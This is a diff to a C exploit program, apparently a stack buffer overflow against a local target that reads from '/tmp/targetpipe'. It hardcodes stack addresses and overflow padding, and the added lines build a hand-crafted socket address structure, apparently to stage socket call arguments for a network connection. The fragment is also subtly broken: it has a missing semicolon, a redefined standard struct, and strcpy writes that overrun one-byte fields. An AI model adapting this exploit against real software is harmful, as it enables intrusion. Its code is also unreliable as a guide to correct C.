@@ -5,6 +5,14 @@
 
 #define PIPEPATH "/tmp/targetpipe"
 
+struct sockaddr_in {
+  char filler[1]; // Byte 0
+  char af_inent[1]; // Byte 1
+  char port_num[2]; // Bytes 2-3
+  char ip_addr[4]; // Bytes 4-7
+  char filler2[8] // Bytes 8-15
+} sockaddr_in;
+
 int main(void)
 {
   char bufr[300]; // address = 0xbfbf671d
@@ -35,6 +43,12 @@ int main(void)
   char socket_stack_arg2_address[] = "\x08\x68\xbf\xbf"; // -> 1
   char socket_stack_arg3_address[] = "\x0c\x68\xbf\xbf"; // -> 0
 
+  struct sockaddr_in info;
+  strcpy(info.filler, "\x01");
+  strcpy(info.af_inent, "\x02");
+  strcpy(info.port_num, "\x39\x30");
+  strcpy(info.ip_addr, "\x01\x01\x01\x7f"); // filler value
+  strcpy(info.filler2, "\x01\x01\x01\x01\x01\x01\x01\x01");
   int i;
   // Fill up buffer
   for(i = 0; i < 131; i++)
